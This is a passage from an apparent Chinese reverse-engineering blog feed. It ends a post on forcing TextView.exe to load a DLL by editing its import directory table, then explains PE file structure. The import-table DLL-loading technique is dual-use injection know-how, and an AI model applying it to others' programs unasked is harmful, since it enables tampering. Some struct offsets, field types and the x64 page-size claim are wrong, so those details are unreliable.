<span class="hljs-literal">NULL</span>));<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dummy</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h2 id="修改TextView-exe文件"><a href="#修改TextView-exe文件" class="headerlink" title="修改TextView.exe文件"></a>修改TextView.exe文件</h2><h3 id="IMAGE-IMPORT-DESCRIPTOR"><a href="#IMAGE-IMPORT-DESCRIPTOR" class="headerlink" title="IMAGE_IMPORT_DESCRIPTOR"></a>IMAGE_IMPORT_DESCRIPTOR</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_IMAGE_IMPORT_DESCRIPTOR</span><br>&#123;<br>    uion&#123;<br>        DWORD Characteristics;<br>        DWORD OriginalFirstThunk;<span class="hljs-comment">//指向输入名称表</span><br>    &#125;;<br>    DWORD TimeDateStamp;<span class="hljs-comment">//时间标志</span><br>    DWORD ForwarderChain;<span class="hljs-comment">//一般为0，在程序引用一个DLL中的API，而这个API又在引用其他DLL的API时使用</span><br>    DWORD Name;<span class="hljs-comment">//DLL名字的指针</span><br>    DWORD FirstThunk;<span class="hljs-comment">//包含输入地址表（IAT）的RVA</span><br>&#125;IMAGE_IMPORT_DESCRIPTOR;<br></code></pre></td></tr></table></figure><h3 id="移动IDT"><a href="#移动IDT" class="headerlink" title="移动IDT"></a>移动IDT</h3><p>若文件中的<code>IDT</code>没有足够的空间新增<code>IID</code>时就需要将<code>IDT</code>移动。可以采用下列三种方式移动</p><ul><li>查找文件中的空白区域</li><li>增加文件最后一节区的大小</li><li>在文件末尾添加新节区</li></ul>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE文件结构</title>
    <link href="/2023/06/07/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
    <url>/2023/06/07/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1 id="PE文件结构"><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h1><p><img src="https://github.com/h0pe-ay/picgo/raw/master/020606_20d5f918_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><h2 id="MS-DOS头部"><a href="#MS-DOS头部" class="headerlink" title="MS-DOS头部"></a>MS-DOS头部</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"> IMAGE_DOS_HEADER_STRUCT&#123;<br>    +<span class="hljs-number">0h</span> e_magic <span class="hljs-built_in">WORD</span> //DOS标记 MZ<br>    +<span class="hljs-number">2h</span> e_cblp <span class="hljs-built_in">WORD</span><br>    +<span class="hljs-number">4h</span> e_cp <span class="hljs-built_in">WORD</span><br>    +<span class="hljs-number">6h</span> e_crlc <span class="hljs-built_in">WORD</span><br>    +<span class="hljs-number">8h</span> e_cparhdr <span class="hljs-built_in">WORD</span><br>    +<span class="hljs-number">0ah</span> e_minalloc <span class="hljs-built_in">WORD</span><br>    +<span class="hljs-number">0ch</span> e_maxalloc <span class="hljs-built_in">WORD</span><br>    +<span class="hljs-number">0eh</span> e_ss <span class="hljs-built_in">WORD</span><br>    +<span class="hljs-number">10h</span> e_sp <span class="hljs-built_in">WORD</span><br>    +<span class="hljs-number">12h</span> e_csum <span class="hljs-built_in">WORD</span><br>    +<span class="hljs-number">14h</span> e_ip <span class="hljs-built_in">WORD</span><br>    +<span class="hljs-number">16h</span> e_cs <span class="hljs-built_in">WORD</span><br>    +<span class="hljs-number">18h</span> e_lfarlc <span class="hljs-built_in">WORD</span><br>    +<span class="hljs-number">1ah</span> e_ovno <span class="hljs-built_in">WORD</span><br>    +<span class="hljs-number">1ch</span> e_res <span class="hljs-built_in">WORD</span><br>    +<span class="hljs-number">24h</span> e_oemid <span class="hljs-built_in">WORD</span><br>    +<span class="hljs-number">26h</span> e_oeminfo <span class="hljs-built_in">WORD</span><br>    +<span class="hljs-number">28h</span> e_mres2 <span class="hljs-built_in">WORD</span><br>    +<span class="hljs-number">3ch</span> e_lfanew <span class="hljs-built_in">DWORD</span>  //指向PE文件头，是RVA <br>&#125;IMAGE_DOS_HEADER_ENDS<br></code></pre></td></tr></table></figure><h2 id="PE文件头"><a href="#PE文件头" class="headerlink" title="PE文件头"></a>PE文件头</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">IMAGE_NT_HEADERS STRUCT&#123;<br>+<span class="hljs-number">0</span><span class="hljs-built_in">h</span>SignatureDWORD <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">#define IMAGE_NT_SIGNATURE</span><br>+<span class="hljs-number">4</span><span class="hljs-built_in">h</span>FileHeaderIMAGE_FILE_HEADER<br>+<span class="hljs-number">18</span><span class="hljs-built_in">h</span>OptionalHeaderIMAGE_OPTIONAL_HEADER32<br>&#125;IMAGE_NT_HEADERS64 ENDS<br></code></pre></td></tr></table></figure><h2 id="64位PE文件头"><a href="#64位PE文件头" class="headerlink" title="64位PE文件头"></a>64位PE文件头</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">IMAGE_NT_HEADERS STRUCT&#123;<br>+<span class="hljs-number">0</span><span class="hljs-built_in">h</span>SignatureDWORD  <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">#define IMAGE_NT_SIGNATURE</span><br>+<span class="hljs-number">4</span><span class="hljs-built_in">h</span>FileHeaderIMAGE_FILE_HEADER<br>+<span class="hljs-number">18</span><span class="hljs-built_in">h</span>OptionalHeaderIMAGE_OPTIONAL_HEADER64<br>&#125;IMAGE_NT_HEADERS64 ENDS<br></code></pre></td></tr></table></figure><h2 id="IMAGE-FILE-HEADER"><a href="#IMAGE-FILE-HEADER" class="headerlink" title="IMAGE_FILE_HEADER"></a>IMAGE_FILE_HEADER</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++">IMAGE_FILE_HEADER STRUCT&#123;<br>+<span class="hljs-number">04</span>HMachine WORD <span class="hljs-comment">//运行平台</span><br>+<span class="hljs-number">06</span>HNumberOfSectionsWORD <span class="hljs-comment">//文件的区块数 </span><br>+<span class="hljs-number">08</span>HTimeDateStampDWORD <span class="hljs-comment">//文件创建日期和时间</span><br>+<span class="hljs-number">0</span>CHPointerToSymbolTableDWORD <span class="hljs-comment">//指向符号表</span><br>+<span class="hljs-number">10</span>HNumberOfSymbolsDwORD <span class="hljs-comment">//符号表符号的个数</span><br>+<span class="hljs-number">14</span>HSizeOfOptionalHeaderWORD IMAGE_OPTIONAL_HEADER32<span class="hljs-comment">//结构的大小</span><br>+<span class="hljs-number">16</span>HCharacteristicsWORD <span class="hljs-comment">//文件属性</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IMAGE-OPTIONAL-HEADER"><a href="#IMAGE-OPTIONAL-HEADER" class="headerlink" title="IMAGE_OPTIONAL_HEADER"></a>IMAGE_OPTIONAL_HEADER</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">IMAGE_OPTIONAL_HEADER32 STRUCT<br>+<span class="hljs-number">18H</span>Magic<span class="hljs-built_in">WORD</span><span class="hljs-comment">;标志字</span><br>+<span class="hljs-number">1AH</span>MajorLinkerVersion <span class="hljs-built_in">BYTE</span><span class="hljs-comment">;链接器主版本号</span><br>+<span class="hljs-number">1BH</span>MinorLinkerVersion <span class="hljs-built_in">BYTE</span><span class="hljs-comment">;链接器次版本号</span><br>+<span class="hljs-number">1CH</span>SizeOfCode   <span class="hljs-built_in">DWORD</span><span class="hljs-comment">;所有含有代码的区块的大小</span><br>+<span class="hljs-number">20H</span>SizeOfInitializedData<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;所有初始化数据区块的大小</span><br>+<span class="hljs-number">24H</span>SizeOfUninitializedData<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;所有未初始化数据区块的大小</span><br>+<span class="hljs-number">28H</span>AddressOfEntryPoint<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;程序指向入口RVA</span><br>+<span class="hljs-number">2CH</span>BaseOfCode<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;代码区块起始RVA</span><br>+<span class="hljs-number">30H</span>BaseOfData<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;数据区块起始RVA</span><br>+<span class="hljs-number">34H</span>ImageBase<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;程序默认载入基地址</span><br>+<span class="hljs-number">38H</span>SectionAlignment<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;内存中区块的对齐值</span><br>+<span class="hljs-number">3cH</span>FileAlign<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;文件中区块的对齐值</span><br>+<span class="hljs-number">40H</span>MajorOperationSystemVersion<span class="hljs-built_in">WORD</span><span class="hljs-comment">;操作系统主版本号</span><br>+<span class="hljs-number">42H</span>MinoroperationSystemVersion<span class="hljs-built_in">WORD</span><span class="hljs-comment">;操作系统次版本号</span><br>+<span class="hljs-number">44H</span>MajorImageVersion<span class="hljs-built_in">WORD</span><span class="hljs-comment">;用户自定义主版本号</span><br>+<span class="hljs-number">46H</span>MinorImageVersion<span class="hljs-built_in">WORD</span><span class="hljs-comment">;用户自定义次版本号</span><br>+<span class="hljs-number">48H</span>MajorSubsystemVersion <span class="hljs-built_in">WORD</span><span class="hljs-comment">;所需子系统主版本号</span><br>+<span class="hljs-number">4aH</span>MinorSubsystemVersion <span class="hljs-built_in">WORD</span><span class="hljs-comment">;所需子系统次版本号</span><br>+<span class="hljs-number">4cH</span>Win32VersionValue<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;保留，通常被设置为0</span><br>    +<span class="hljs-number">50H</span>SizeOfImage<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;映像载入内存后的总尺寸</span><br>+<span class="hljs-number">54H</span>SizeOfHeaders<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;MS-DOS头部、PE文件头、区块表总大小</span><br>+<span class="hljs-number">58H</span>CheckSum<span class="hljs-built_in">WORD</span><span class="hljs-comment">;映像校验和</span><br>+<span class="hljs-number">5cH</span>Subsystem<span class="hljs-built_in">WORD</span><span class="hljs-comment">;文件子系统</span><br>+<span class="hljs-number">5eH</span>DLLCharacteristics <span class="hljs-built_in">WORD</span><span class="hljs-comment">;显示DLL特性的旗帜</span><br>+<span class="hljs-number">60H</span>SizeOfStackReserve<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;初始化时栈的大小</span><br>+<span class="hljs-number">64H</span>SizeOfStackCommit<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;初始化时实际提交栈的大小</span><br>+<span class="hljs-number">68H</span>SizeOfHeapReserve<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;初始化时堆的大小</span><br>+<span class="hljs-number">6cH</span>SizeOfHeapCommit<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;初始化时实际提交堆的大小</span><br>+<span class="hljs-number">70H</span>LoaderFlags<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;与调试相关，默认值为0</span><br>+<span class="hljs-number">74H</span>NumberOfRvaAndSize<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;数据目录表的项数</span><br>+<span class="hljs-number">78H</span>DataDirectory<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;IMAGE_DATA_DIRECTROY </span><br></code></pre></td></tr></table></figure><h2 id="64位下IMAGE-OPTIONAL-HEADER"><a href="#64位下IMAGE-OPTIONAL-HEADER" class="headerlink" title="64位下IMAGE_OPTIONAL_HEADER"></a>64位下IMAGE_OPTIONAL_HEADER</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">IMAGE_OPTIONAL_HEADER32 STRUCT<br>+<span class="hljs-number">18H</span>Magic<span class="hljs-built_in">WORD</span><span class="hljs-comment">;标志字</span><br>+<span class="hljs-number">1AH</span>MajorLinkerVersion <span class="hljs-built_in">BYTE</span><span class="hljs-comment">;链接器主版本号</span><br>+<span class="hljs-number">1BH</span>MinorLinkerVersion <span class="hljs-built_in">BYTE</span><span class="hljs-comment">;链接器次版本号</span><br>+<span class="hljs-number">1CH</span>SizeOfCode   <span class="hljs-built_in">DWORD</span><span class="hljs-comment">;所有含有代码的区块的大小</span><br>+<span class="hljs-number">20H</span>SizeOfInitializedData<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;所有初始化数据区块的大小</span><br>+<span class="hljs-number">24H</span>SizeOfUninitializedData<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;所有未初始化数据区块的大小</span><br>+<span class="hljs-number">28H</span>AddressOfEntryPoint<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;程序指向入口RVA</span><br>+<span class="hljs-number">2CH</span>BaseOfCode<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;代码区块起始RVA</span><br>+<span class="hljs-number">30H</span>ImageBaseULONGLONGU7<span class="hljs-comment">;程序默认载入基地址</span><br>+<span class="hljs-number">38H</span>SectionAlignment<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;内存中区块的对齐值</span><br>+<span class="hljs-number">3cH</span>FileAlign<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;文件中区块的对齐值</span><br>+<span class="hljs-number">40H</span>MajorOperationSystemVersion<span class="hljs-built_in">WORD</span><span class="hljs-comment">;操作系统主版本号</span><br>+<span class="hljs-number">42H</span>MinoroperationSystemVersion<span class="hljs-built_in">WORD</span><span class="hljs-comment">;操作系统次版本号</span><br>+<span class="hljs-number">44H</span>MajorImageVersion<span class="hljs-built_in">WORD</span><span class="hljs-comment">;用户自定义主版本号</span><br>+<span class="hljs-number">46H</span>MinorImageVersion<span class="hljs-built_in">WORD</span><span class="hljs-comment">;用户自定义次版本号</span><br>+<span class="hljs-number">48H</span>MajorSubsystemVersion <span class="hljs-built_in">WORD</span><span class="hljs-comment">;所需子系统主版本号</span><br>+<span class="hljs-number">4aH</span>MinorSubsystemVersion <span class="hljs-built_in">WORD</span><span class="hljs-comment">;所需子系统次版本号</span><br>+<span class="hljs-number">4cH</span>Win32VersionValue<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;保留，通常被设置为0</span><br>    +<span class="hljs-number">50H</span>SizeOfImage<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;映像载入内存后的总尺寸</span><br>+<span class="hljs-number">54H</span>SizeOfHeaders<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;MS-DOS头部、PE文件头、区块表总大小</span><br>+<span class="hljs-number">58H</span>CheckSum<span class="hljs-built_in">WORD</span><span class="hljs-comment">;映像校验和</span><br>+<span class="hljs-number">5cH</span>Subsystem<span class="hljs-built_in">WORD</span><span class="hljs-comment">;文件子系统</span><br>+<span class="hljs-number">5eH</span>DLLCharacteristics <span class="hljs-built_in">WORD</span><span class="hljs-comment">;显示DLL特性的旗帜</span><br>+<span class="hljs-number">60H</span>SizeOfStackReserveULONGLONG<span class="hljs-comment">;初始化时栈的大小</span><br>+<span class="hljs-number">68H</span>SizeOfStackCommitULONGLONG<span class="hljs-comment">;初始化时实际提交栈的大小</span><br>+<span class="hljs-number">70H</span>SizeOfHeapReserveULONGLONG<span class="hljs-comment">;初始化时堆的大小</span><br>+<span class="hljs-number">78H</span>SizeOfHeapCommitULONGLONG<span class="hljs-comment">;初始化时实际提交堆的大小</span><br>+<span class="hljs-number">80H</span>LoaderFlags<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;与调试相关，默认值为0</span><br>+<span class="hljs-number">84H</span>NumberOfRvaAndSize<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;数据目录表的项数</span><br>+<span class="hljs-number">88H</span>DataDirectory<span class="hljs-built_in">DWORD</span><span class="hljs-comment">;IMAGE_DATA_DIRECTROY </span><br></code></pre></td></tr></table></figure><h2 id="IMAGE-DATA-DIRECTORY"><a href="#IMAGE-DATA-DIRECTORY" class="headerlink" title="IMAGE_DATA_DIRECTORY"></a>IMAGE_DATA_DIRECTORY</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">IMAGE_DATA_DIRECTORY STRUCT<br>VirtualAddress DWORD<span class="hljs-comment">;数据块的起始RVA</span><br>Size   DWORD<span class="hljs-comment">;数据块的长度</span><br></code></pre></td></tr></table></figure><h2 id="数据目录的成员"><a href="#数据目录的成员" class="headerlink" title="数据目录的成员"></a>数据目录的成员</h2><table><thead><tr><th>序号</th><th>成员</th><th>结构</th><th>偏移量(PE&#x2F;PE32+)</th></tr></thead><tbody><tr><td>0</td><td>Export Table</td><td>IMAGE_DIRECTORY_ENTRY_EXPORT</td><td>78H&#x2F;88H</td></tr><tr><td>1</td><td>Import Table</td><td>IMAGE_DIRECTORY_ENTRY_IMPORT</td><td>80H&#x2F;90H</td></tr><tr><td>2</td><td>Resources Table</td><td>IMAGE_DIRECTORY_ENTRY_RESOURCE</td><td>88H&#x2F;98H</td></tr><tr><td>3</td><td>Exception Table</td><td>IMAGE_DIRECTORY_ENTRY_EXCEPTION</td><td>90H&#x2F;A0H</td></tr><tr><td>4</td><td>Security Table</td><td>IMAGE_DIRECTORY_ENTRY_SECURITY</td><td>98H&#x2F;A8H</td></tr><tr><td>5</td><td>Base relocation Table</td><td>IMAGE_DIRECTORY_ENTRY_BASERELOC</td><td>A0H&#x2F;B0H</td></tr><tr><td>6</td><td>Debug</td><td>IMAGE_DIRECTORY_ENTRY_DEBUG</td><td>A8H&#x2F;B8H</td></tr><tr><td>7</td><td>Copyright</td><td>IMAGE_DIRECTORY_ENTRY_COPYRIGHT</td><td>B0H&#x2F;C0H</td></tr><tr><td>8</td><td>Global Ptr</td><td>IMAGE_DIRECTORY_ENTRY_GLOBALPTR</td><td>D8H&#x2F;C8H</td></tr><tr><td>9</td><td>Thread local storage(TLS)</td><td>IMAGE_DIRECTORY_ENTRY_TLS</td><td>C0H&#x2F;D0H</td></tr><tr><td>10</td><td>Load configuration</td><td>IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG</td><td>C8H&#x2F;D8H</td></tr><tr><td>11</td><td>Bound Import</td><td>IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT</td><td>D0H&#x2F;E0H</td></tr><tr><td>12</td><td>Import Address Table(IAT)</td><td>IMAGE_DIRECTORY_ENTRY_IAT</td><td>D8H&#x2F;E8H</td></tr><tr><td>13</td><td>Delay Import</td><td>IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT</td><td>E0H&#x2F;F0H</td></tr><tr><td>14</td><td>COM descriptor</td><td>IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR</td><td>E8H&#x2F;F8H</td></tr><tr><td>15</td><td>保留，必须为0</td><td></td><td>F0H&#x2F;100H</td></tr></tbody></table><h2 id="IMAGE-SECTION-HEADER"><a href="#IMAGE-SECTION-HEADER" class="headerlink" title="IMAGE_SECTION_HEADER"></a>IMAGE_SECTION_HEADER</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs abnf">IMAGE_SECTION_HEADER <br>NAMEBYTE8<span class="hljs-comment">;8字节得块名</span><br>unionMisc<span class="hljs-comment">;区块尺寸</span><br>PhysicalAddressDWORD<br>VirtualSizeDWORD<span class="hljs-comment">;实际被使用的区块的大小</span><br>VirtualAddressDWORD<span class="hljs-comment">;区块的RVA地址</span><br>SizeOfRawDataDWORD<span class="hljs-comment">;在文件中对齐后的尺寸</span><br>PointerToRawDataDWORD<span class="hljs-comment">;在文件中的偏移</span><br>PointerToRelocationsDWORD<span class="hljs-comment">;在OBJ文件中使用，重定位的偏移</span><br>PointerToLinenumbersDWORD<span class="hljs-comment">;行号表的偏移(供调试用)</span><br>NumberOfRelocationsWORD<span class="hljs-comment">;在OBJ文件中使用，重定位项数目</span><br>NumberOfLinenumbersWORD<span class="hljs-comment">;行号表中行号的数目</span><br>CharacteristicsDWORD<span class="hljs-comment">;区块的属性</span><br><br></code></pre></td></tr></table></figure><table><thead><tr><th>字段值</th><th>地址</th><th>用途</th></tr></thead><tbody><tr><td>IMAGE_SCN_SNT_CODE</td><td>00000020H</td><td>包含代码，常与100000000h一起设置</td></tr><tr><td>IMAGE_SCN_CNT_INITIALIZED_DATA</td><td>00000040H</td><td>该块包含已初始化的数据</td></tr><tr><td>IMAGE_SCN_CNT_UNINITIALIZED_DATA</td><td>00000080H</td><td>该块包含未初始化的数据</td></tr><tr><td>IMAGE_SCN_MEM_DISCARDABLE</td><td>02000000H</td><td>该块可被丢弃，因为它一旦被载入，进程就不再需要它，常见的可丢弃块是.reloc(重定位块)</td></tr><tr><td>IMAGE_SCN_MEM_SHARED</td><td>10000000H</td><td>该块为共享块</td></tr><tr><td>IMAGE_SCN_MEM_READ</td><td>40000000H</td><td>该块可读。可执行文件中的块总是被设置该标志</td></tr><tr><td>IMAGE_SCN_MEM_EXECUTE</td><td>20000000H</td><td>该块可以执行。通常当00000020H标志被设置时，该标志也被设置</td></tr><tr><td>IMAGE_SCN_MEM_WRITE</td><td>80000000H</td><td>该块可写。如果PE文件中没有设置该标志，装载程序就会将内存映像页标记为</td></tr></tbody></table><h2 id="常见区块"><a href="#常见区块" class="headerlink" title="常见区块"></a>常见区块</h2><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>.text</td><td>代码区块，内容全是指令代码。链接器把所有目标文件的.text块链接成一个大的.text块。</td></tr><tr><td>.data</td><td>默认的读&#x2F;写数据区块。全局变量、静态变量一般放在这里</td></tr><tr><td>.rdata</td><td>默认的只读区块，程序很少用到该块。有两种情况需要用到.rdata块。一是在Microsoft链接器产生的EXE文件中，用于存放调试目录;二是用于存放说明字符串。如果程序的DEF文件中指定了DESCRIPTION，字符串就会出现在.rdata块中。</td></tr><tr><td>.idata</td><td>包含其他外来的DLL的函数及数据信息，即输入表。将.idata区块合并到另一个区块已成为惯例，典型的是.rdata区块。</td></tr><tr><td>.edata</td><td>输出表。当创建一个输出API或数据的可执行文件时，链接器会创建一个.EXP文件，这个.EXP文件包含一个.edata区块，它会被加入最后的可执行文件中。idata区块也经常被合并</td></tr><tr><td>.rsrc</td><td>资源。包含模块的全部资源，例如图标、菜单、位图等。这个区块是只读的，不能命名位.rsrc以外的名字，也不能被合并。</td></tr><tr><td>.bss</td><td>未初始化数据。</td></tr><tr><td>.crt</td><td>用于支持c++运行时(CRT)所添加的数据</td></tr><tr><td>.tls</td><td>TLS的意思是线程局部存储器，用于支持通过__declspec(thread)声明的线程局部存储变量的数据，既包括数据的初始化值，也包括运行时所需的额外变量</td></tr><tr><td>.reloc</td><td>可执行文件的基址重定位。基址重定位一般只是DLL需要。在Release模式下，链接器不回给EXE文件加上基质重定位。</td></tr><tr><td>.sdata</td><td>IA-64的常规大小的全局变量放在这个区块。</td></tr><tr><td>.pdata</td><td>异常表，包含一个CPU特定的IMAGE_RUNTIME_FUNCTION_ENTRY结构数组，DataDirectory中的IMAGE_DIRECTORY_ENTRY_EXCEPTION指向它。它用于异常处理，是基于表的体系结构，就像IA-64。唯一不使用基于表的以尝处理架构体系是x86</td></tr><tr><td>.debug$S</td><td>OBJ文件中Codeview格式的符号。这是一个变量长度的Codeview格式的符号记录流</td></tr><tr><td>.debug$T</td><td>OBJ文件中Codeview格式的类型记录。这是一个变量长度的Codeview格式的类型记录流</td></tr><tr><td>.debug$P</td><td>当使用预编译的头时，可以在OBJ文件中找到它</td></tr><tr><td>.drectve</td><td>包含链接器命令，只能在OBJ中找到它。命令是能被传递给练级额其命令行的字符串。例如:-defaultlib:LIBC，命令行用空格字符分开</td></tr><tr><td>.didat</td><td>延迟载入的输入数据，只能在非Release模式的可执行文件中找到。在Release模式下，延迟载入的数据会被合并到另一个区块中</td></tr></tbody></table><h2 id="区块的对齐值"><a href="#区块的对齐值" class="headerlink" title="区块的对齐值"></a>区块的对齐值</h2><p>有两个对齐值，一种用于磁盘内，另一种用于内存中。PE文件头指出了这两个值。在PE文件头里，<code>FileAlignment</code>定义了磁盘区块的对齐值。每一个区块从对齐值的倍数的偏移位置开始，但是区块的实际代码或数据的大小不一定刚好是这么多，不足用00H填充。被填充的空间被称为区块间隙。</p><p>在PE文件里，SectionAlignment定义了内存中区块的对齐值。当PE文件被映射到内u那种时，区块总是至少从一个页边界处开始。每个区块的第一个字节对应于某个内存页。在x86系统CPU中，内存页是按4KB(1000h)排列的;在x64中内存是按8KB(2000h)排列的。</p><h2 id="文件偏移与虚拟地址地址的转换"><a href="#文件偏移与虚拟地址地址的转换" class="headerlink" title="文件偏移与虚拟地址地址的转换"></a>文件偏移与虚拟地址地址的转换</h2><p>PE文件为了减少题基，磁盘对齐值不是一个内存页1000h，而是200h。因此这类文件被映射到内存中后，同一数据相对于文件头的偏移量在内存中与在磁盘中不同。</p><h2 id="输入表"><a href="#输入表" class="headerlink" title="输入表"></a>输入表</h2><p>可执行文件使用来自其他DLL的代码或数据的动作称为输入。当PE文件被载入后，Windows加载器的工作就是定位所有被输入的函数和数据，并让正在载入的文件可以使用那些地址。这个过程是通过PE文件的输入表(Import Table,也称导入表)完成的。输入表中保存的是函数名和其驻留的DLL名等动态链接所需要的信息。</p><h3 id="输入函数的调用"><a href="#输入函数的调用" class="headerlink" 